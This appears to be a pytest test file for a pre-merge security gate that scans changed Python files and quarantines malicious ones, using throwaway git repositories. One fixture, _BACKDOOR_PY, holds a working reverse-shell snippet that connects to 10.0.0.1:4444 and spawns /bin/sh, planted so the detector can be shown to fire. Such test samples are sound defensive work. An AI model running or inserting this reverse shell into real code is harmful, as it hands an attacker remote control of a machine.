# CUI // SP-CTI
"""Tests for the SIPA pre-merge / PR gate (eqo-sipa-01).

Covers ``tools/integrity/pr_gates.py``'s ``assess_changed_files()`` + ``--gate``/
``--json`` CLI, which assesses *only the Python files a branch changed* (``git diff``
against a base ref) by reusing the engine stages (``ingest.stage`` -> ``scan_all`` ->
``extract_and_persist`` -> ``score``).

The three acceptance cases from the task:

  * **clean change** — a benign added ``.py`` scores under the review threshold ->
    ``allow`` / gate exit 0.
  * **planted known-bad signature** — an added reverse-shell ``.py`` trips the
    deterministic malicious-signature fallback (critical ``known_bad_signature``),
    forcing ``quarantine`` / gate exit 1.
  * **no Python files changed** — a non-``.py`` change yields the no-op ``allow``
    disposition with no assessment row.

A real throwaway git repo drives the ``git diff`` discovery (the honest path); the
pipeline runs for real against an in-memory SQLite connection. The two
subprocess-backed scanner seams are stubbed for determinism (matching
``test_integrity_engine.py``): ``scanners._invoke_scanner`` returns an empty JSON
document and ``scanners._detect_signatures`` returns ``None`` so the signature scan
exercises its regex fallback (no Semgrep binary required).
"""
import subprocess
import sqlite3

import pytest

from tools.integrity import engine, pr_gates, scanners
from tools.integrity.db import init_db as init_db_mod


# --------------------------------------------------------------------------- #
# Fixture source bodies
# --------------------------------------------------------------------------- #
_BASE_PY = '''\
"""Seed module present at the base commit."""


def greet(name):
    return f"hello {name}"
'''

_BENIGN_PY = '''\
"""A benign helper added on the feature branch — reads/writes a file, nothing else."""
from pathlib import Path


def save(path, text):
    Path(path).write_text(text, encoding="utf-8")
'''

# Reverse-shell backdoor: os.dup2(s.fileno()) + /bin/sh -i trip the regex signature
# fallback -> critical known_bad_signature -> hard QUARANTINE override.
_BACKDOOR_PY = '''\
import os
import socket
import subprocess


def _callback():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    subprocess.call(["/bin/sh", "-i"])
'''


# --------------------------------------------------------------------------- #
# Git repo fixture
# --------------------------------------------------------------------------- #
def _git(repo, *args):
    """Run a git command in ``repo`` with isolated, deterministic identity."""
    cmd = [
        "git",
        "-c", "user.email=test@icdev.local",
        "-c", "user.name=ICDEV Test",
        "-c", "commit.gpgsign=false",
        "-c", "core.autocrlf=false",
        *args,
    ]
    proc = subprocess.run(
        cmd, cwd=str(repo), shell=False, capture_output=True, text=True, check=False,
    )
    assert proc.returncode == 0, f"git {args} failed: {proc.stderr or proc.stdout}"
    return proc.stdout.strip()


@pytest.fixture
def git_repo(tmp_path):
    """A throwaway git repo with one base commit; returns (repo_path, base_sha).

    Skips the whole module if git is unavailable on PATH.
    """
    import shutil as _shutil

    if _shutil.which("git") is None:
        pytest.skip("git not available on PATH")

    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    (repo / "seed.py").write_text(_BASE_PY, encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "base")
    base_sha = _git(repo, "rev-parse", "HEAD")
    return repo, base_sha


def _commit_change(repo, files):
    """Write ``{rel: content}`` into ``repo`` and commit them (advances HEAD)."""
    for rel, content in files.items():
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "change")


# --------------------------------------------------------------------------- #
# Shared test plumbing
# --------------------------------------------------------------------------- #
@pytest.fixture
def conn():
    c = sqlite3.connect(":memory:")
    c.row_factory = sqlite3.Row
    init_db_mod.init_db(c)
    yield c
    c.close()


@pytest.fixture
def deterministic_scanners(monkeypatch, tmp_path):
    """Deterministic, offline scan_all + an isolated quarantine dir."""
    monkeypatch.setenv("ICDEV_INTEGRITY_QUARANTINE_DIR", str(tmp_path / "quarantine"))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    monkeypatch.setattr(scanners, "_invoke_scanner", lambda cmd, timeout: (0, "{}", ""))
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: None)


# --------------------------------------------------------------------------- #
# changed_py_files — discovery + filtering
# --------------------------------------------------------------------------- #
def test_changed_py_files_lists_only_added_python(git_repo):
    repo, base = git_repo
    _commit_change(repo, {"pkg/new_mod.py": _BENIGN_PY, "README.md": "# docs\n"})

    files = pr_gates.changed_py_files(base=base, repo_root=repo)
    assert files == ["pkg/new_mod.py"]  # README.md filtered out


def test_changed_py_files_empty_when_no_python(git_repo):
    repo, base = git_repo
    _commit_change(repo, {"NOTES.md": "no code here\n"})

    assert pr_gates.changed_py_files(base=base, repo_root=repo) == []


# --------------------------------------------------------------------------- #
# assess_changed_files — the three acceptance cases
# --------------------------------------------------------------------------- #
def test_clean_change_is_allow(git_repo, conn, deterministic_scanners):
    repo, base = git_repo
    _commit_change(repo, {"clean.py": _BENIGN_PY})

    result = pr_gates.assess_changed_files(base=base, repo_root=repo, conn=conn)

    assert result["verdict"] == "allow"
    assert result["risk_score"] < 40
    assert result["files_assessed"] == ["clean.py"]
    assert result["assessment_id"] is not None
    assert engine.gate_exit_code(result["verdict"]) == engine.GATE_OK


def test_planted_backdoor_is_quarantine(git_repo, conn, deterministic_scanners):
    repo, base = git_repo
    _commit_change(repo, {"evil.py": _BACKDOOR_PY})

    result = pr_gates.assess_changed_files(base=base, repo_root=repo, conn=conn)

    assert result["verdict"] == "quarantine"
    assert result["files_assessed"] == ["evil.py"]
    # The malicious-signature fallback fired a known_bad_signature finding.
    assert any(f["finding_type"] == "known_bad_signature" for f in result["findings"])
    assert engine.gate_exit_code(result["verdict"]) == engine.GATE_BLOCK


def test_no_python_files_changed_passes(git_repo, conn, deterministic_scanners):
    repo, base = git_repo
    _commit_change(repo, {"CHANGELOG.md": "- nothing pythonic\n"})

    result = pr_gates.assess_changed_files(base=base, repo_root=repo, conn=conn)

    assert result["verdict"] == "allow"
    assert result["risk_score"] == 0.0
    assert result["files_assessed"] == []
    assert result["findings"] == []
    assert result["assessment_id"] is None  # no assessment row created


def test_only_existing_files_assessed(git_repo, conn, deterministic_scanners):
    """A file deleted on the branch is excluded (it cannot be staged)."""
    repo, base = git_repo
    _commit_change(repo, {"kept.py": _BENIGN_PY})
    # Remove the seed file that existed at base — it is a diff entry but is gone.
    (repo / "seed.py").unlink()
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "drop seed")

    result = pr_gates.assess_changed_files(base=base, repo_root=repo, conn=conn)
    assert result["files_assessed"] == ["kept.py"]  # seed.py excluded (deleted)


# --------------------------------------------------------------------------- #
# CLI — exit codes + feature flag
# --------------------------------------------------------------------------- #
def test_cli_gate_blocks_on_quarantine(git_repo, conn, deterministic_scanners, monkeypatch):
    repo, base = git_repo
    _commit_change(repo, {"evil.py": _BACKDOOR_PY})
    monkeypatch.setenv("ICDEV_INTEGRITY_ENABLED", "true")
    # Run the discovery against the throwaway repo, not the live tree.
    monkeypatch.setattr(pr_gates, "BASE_DIR", repo)

    with pytest.raises(SystemExit) as exc:
        pr_gates.main(["--base", base, "--gate", "--json"], conn=conn)
    assert exc.value.code == engine.GATE_BLOCK


def test_cli_gate_allows_clean(git_repo, conn, deterministic_scanners, monkeypatch):
    repo, base = git_repo
    _commit_change(repo, {"clean.py": _BENIGN_PY})
    monkeypatch.setenv("ICDEV_INTEGRITY_ENABLED", "true")
    monkeypatch.setattr(pr_gates, "BASE_DIR", repo)

    with pytest.raises(SystemExit) as exc:
        pr_gates.main(["--base", base, "--gate", "--json"], conn=conn)
    assert exc.value.code == engine.GATE_OK


def test_cli_skips_when_flag_disabled(git_repo, conn, monkeypatch):
    repo, base = git_repo
    _commit_change(repo, {"evil.py": _BACKDOOR_PY})
    monkeypatch.delenv("ICDEV_INTEGRITY_ENABLED", raising=False)

    # Even with a backdoor present, a disabled canvas no-ops to a pass (exit 0).
    with pytest.raises(SystemExit) as exc:
        pr_gates.main(["--base", base, "--gate", "--json"], conn=conn)
    assert exc.value.code == engine.GATE_OK


if __name__ == "__main__":  # pragma: no cover - manual invocation
    raise SystemExit(pytest.main([__file__, "-v"]))
